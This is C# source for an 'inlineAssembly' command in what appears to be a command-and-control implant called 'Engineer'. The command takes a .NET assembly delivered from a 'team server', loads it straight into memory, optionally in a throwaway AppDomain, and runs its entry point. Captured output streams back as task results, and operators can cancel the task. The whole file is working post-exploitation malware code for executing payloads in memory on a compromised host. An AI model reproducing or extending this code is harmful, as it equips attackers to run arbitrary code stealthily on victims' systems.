using Engineer.Extra;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class InlineAssembly : EngineerCommand
    {
        //Goal is to allow the user to use the inline assembly feature to execute .net code in the engineers current process 
        public override string Name => "inlineAssembly";

        public override async Task Execute(EngineerTask task)
        {

            if (task.File == null)
            {
                Tasking.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            if (task.File.Length < 1)
            {
                Tasking.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            task.Arguments.TryGetValue("/args", out string assemblyArgument);
            assemblyArgument = assemblyArgument.TrimStart(' ');
            assemblyArgument = assemblyArgument.TrimStart('\"');
            assemblyArgument = assemblyArgument.TrimEnd('\"');
            string appDomainName = null;
            string execMethod = "";
            bool execGiven = task.Arguments.TryGetValue("/execmethod", out execMethod);
            if (execGiven)
            {
              bool appNameGiven =  task.Arguments.TryGetValue("/appdomain", out string appname);
                if (appNameGiven)
                {
                    appDomainName = appname;
                }
                else
                {
                    appDomainName = "mscorlib";
                }
            }
            else
            {
                appDomainName = "mscorlib";
            }
            string output = "";

            //set the console out and error to try and capture output from thread execution
            var currentout = Console.Out;
            var currenterror = Console.Error;
            try
            {
                // debase64 encode assembly string into a byte array
                byte[] assemblyBytes = task.File;


                if (execMethod != null && execMethod.Equals("UnloadDomain",StringComparison.CurrentCultureIgnoreCase))
                {
                    var appDomainSetup = new AppDomainSetup
                    {
                        ApplicationBase = AppDomain.CurrentDomain.BaseDirectory
                    };
                    output += $"[+] creating app domain {appDomainName}\n"; 
                    var domain = AppDomain.CreateDomain(appDomainName, null, appDomainSetup);
                    var executor = (AssemblyExecutor)domain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(AssemblyExecutor).FullName);
                    output += executor.Execute(assemblyBytes, assemblyArgument.Split(), task, appDomainName);
                    output += "\n[*] trying to unload appdomain";
                    AppDomain.Unload(domain);
                    output += "\n[+] app domain unloaded";
                }
                else 
                {
                    using var ms = new MemoryStream();
                    using var sw = new StreamWriter(ms)
                    {
                        AutoFlush = true
                    };

                    Console.SetOut(sw);
                    Console.SetError(sw);
                    //make a new thread to run the assembly in and as it gets output from the assembly it will be written to the stream writer
                    Thread thread = new Thread(() =>
                    {
                        //will block so needs its own thread
                        Assembly assembly = Assembly.Load(assemblyBytes);
                        assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
                    });

                    //start the thread 
                    thread.Start();
                    //while the thread is running call Tasking.FillTaskResults to update the task results
                    while (thread.IsAlive)
                    {
                        output = Encoding.UTF8.GetString(ms.ToArray());
                        if (output.Length > 0)
                        {
                            ms.Clear();
                            Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
                            output = ""; 
                        }
                        if (task.cancelToken.IsCancellationRequested)
                        {
                            Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                            thread.Abort();
                            break;
                        }
                        Thread.Sleep(10);
                    }
                    //finish reading and set status to complete 
                    output = Encoding.UTF8.GetString(ms.ToArray());
                    ms.Clear();

                }
                Console.SetOut(currentout);
                Console.SetError(currenterror);
                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
                Console.SetOut(currentout);
                Console.SetError(currenterror);
                Tasking.FillTaskResults($"{output} \n error: " + e.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            }
        }
    }

    internal class AssemblyExecutor : MarshalByRefObject
    {
        public string Execute(byte[] asm, string[] arguments,EngineerTask task,string appdomainName)
        {


            using var ms = new MemoryStream();
            using var sw = new StreamWriter(ms)
            {
                AutoFlush = true
            };

            Console.SetOut(sw);
            Console.SetError(sw);

            Thread thread = new Thread(() =>
            {
                //will block so needs its own thread
                Assembly assembly = Assembly.Load(asm);
                assembly.EntryPoint.Invoke(null, new[] { arguments });
            });

            //start the thread 
            thread.Start();
            string output = "";
            //while the thread is running call Tasking.FillTaskResults to update the task results
            while (thread.IsAlive)
            {
                Console.Out.Flush();
                Console.Error.Flush();
                output = Encoding.UTF8.GetString(ms.ToArray());
                if (output.Length > 0)
                {
                    Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
                    output = "";
                }
                if (task.cancelToken.IsCancellationRequested)
                {
                    Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                    thread.Abort();
                    break;
                }
                Thread.Sleep(10);
            }
            //finish reading and set status to complete
            Console.Out.Flush();
            Console.Error.Flush();
            output = Encoding.UTF8.GetString(ms.ToArray());
            return output;
        }
    }
}
